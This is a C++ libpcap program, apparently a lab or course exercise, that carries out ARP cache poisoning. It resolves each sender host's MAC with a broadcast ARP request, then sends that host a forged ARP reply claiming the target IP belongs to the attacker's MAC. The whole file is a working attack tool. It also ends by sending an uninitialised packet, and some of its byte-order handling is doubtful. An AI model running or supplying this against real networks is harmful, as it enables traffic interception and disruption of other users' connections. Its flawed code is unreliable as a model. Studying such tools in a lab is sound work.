#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include <stdint.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/if_arp.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

int err_handle;
char my_ip_addr[40];
unsigned char my_mac_addr[6];
unsigned char sender_mac_addr[6];

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
    printf("sample: send-arp-test wlan0 1.1.1.1 1.1.1.2 \n");
}

int get_my_mac()
{
    struct ifreq ifr;
        struct ifconf ifc;
        char buf[1024];
        int success = 0;

        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        if (sock == -1) {
            return 0;
        };

        ifc.ifc_len = sizeof(buf);
        ifc.ifc_buf = buf;
        if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
            return 0;
        }

        struct ifreq* it = ifc.ifc_req;
        const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

        for (; it != end; ++it) {
            strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                        success = 1;
                        break;
                    }
                }
            }
            else {
                /* handle error */
                return 0;
            }
        }

        if (success){
            memcpy(my_mac_addr, ifr.ifr_hwaddr.sa_data, 6);
        }
        return success;
}

void get_my_ip(char* dev)
{
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
        printf("error");
        return;
    }else{
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_ip_addr, sizeof(struct sockaddr));
    }

    close(s);
    return;
}

int main(int argc, char* argv[]) {
    if ((argc < 4) || (argc % 2 != 0)) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    get_my_ip(dev);
    err_handle = get_my_mac();
    if(err_handle == 0){
        printf("my mac addr error! \n");
        return -1;
    }

    EthArpPacket packet;
    EthArpPacket packet_broad, packet_atk;
    packet_broad.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    int i, k;
    for(i = 0; i < 6; i++){
    packet_broad.eth_.smac_.mac_[i] = my_mac_addr[i];
    }
    packet_broad.eth_.type_ = htons(EthHdr::Arp);
    packet_broad.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_broad.arp_.pro_ = htons(EthHdr::Ip4);
    packet_broad.arp_.hln_ = Mac::SIZE;
    packet_broad.arp_.pln_ = Ip::SIZE;
    packet_broad.arp_.op_ = htons(ArpHdr::Request);
    for(i = 0; i < 6; i++){
    packet_broad.arp_.smac_.mac_[i] = my_mac_addr[i];
    }
    packet_broad.arp_.sip_ = Ip(my_ip_addr);
    packet_broad.arp_.tmac_ = Mac("00:00:00:00:00:00");
    Ip sender_ip;
    Ip target_ip;
    int j = (argc-2) / 2;
    for(k = 1; k <= j; k++){
        sender_ip = htonl(Ip(argv[2 * k]));
        target_ip = htonl(Ip(argv[2 * k + 1]));

        packet_broad.arp_.tip_ = sender_ip;

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broad), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }
        while(true){
            struct pcap_pkthdr* header;
            const u_char* packet;
            res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            if(res == -1 || res == -2){
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                return -1;
            }

            ArpHdr arp_request, arp_reply;
            arp_request=packet_broad.arp_;
            memcpy(&arp_reply, packet+14, sizeof(ArpHdr));
            if(arp_reply.op_!=htons(ArpHdr::Reply)){
                  continue;
            }

            if(arp_request.sip_ != arp_reply.tip_){
                  continue;
            }

            if(arp_request.tip_ != arp_reply.sip_){
                  continue;
            }

            for(i=0;i<Mac::SIZE;i++){
                  sender_mac_addr[i]=arp_reply.smac_[i];
            }

                break;
        }

        packet_atk.eth_.dmac_ = Mac(sender_mac_addr);
        for(i = 0; i < 6; i++){
            packet_atk.eth_.smac_.mac_[i] = my_mac_addr[i];
        }
        packet_atk.eth_.type_ = htons(EthHdr::Arp);

        packet_atk.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet_atk.arp_.pro_ = htons(EthHdr::Ip4);
        packet_atk.arp_.hln_ = Mac::SIZE;
        packet_atk.arp_.pln_ = Ip::SIZE;
        packet_atk.arp_.op_ = htons(ArpHdr::Reply);
        for(i = 0; i < 6; i++){
            packet_atk.arp_.smac_.mac_[i] = my_mac_addr[i];
        }
        packet_atk.arp_.sip_ = target_ip;
        for(i = 0; i < 6; i++){
            packet_atk.arp_.tmac_.mac_[i] = sender_mac_addr[i];
        }
        packet_atk.arp_.tip_ = sender_ip;

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_atk), sizeof(EthArpPacket));
    }


    int result = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (result != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", result, pcap_geterr(handle));
        return -1;
	}

	pcap_close(handle);
    return 0;
}
